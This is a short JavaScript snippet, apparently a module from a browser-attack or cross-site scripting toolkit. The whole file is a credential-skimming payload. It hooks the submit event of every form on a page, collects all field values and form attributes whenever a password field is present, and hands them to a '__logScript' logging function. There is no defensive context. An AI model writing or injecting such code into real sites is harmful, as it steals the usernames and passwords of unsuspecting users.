// this will try to only log forms with password fields in them
setTimeout(function() {
    var f = document.forms;
    for (var i=0;i<f.length;i++) {
        f[i].addEventListener('submit',function() {
            var form = {};
            var el = [];
            var passwd_found = false;
            for (var i = 0; i<this.elements.length;i++) {
                var e = this.elements[i];
                if (e.disabled || !e.name) {
                    continue;
                }
                if (e.type && e.type.toUpperCase() == 'PASSWORD') {
                    passwd_found = true;
                }
                try {
                    el.push({name: e.name, value: (e.options ? e.options[e.selectedIndex].value : e.value)});
                } catch (e) {}
            }
            if (!passwd_found) { // skip form
                return;
            }
            for (var i = 0; i<this.attributes.length;i++) {
                form[this.attributes[i].name] = this.attributes[i].value;
            }
            form.elements = el;
            __logScript('login form',form);
        }, false);
    }
}, 300);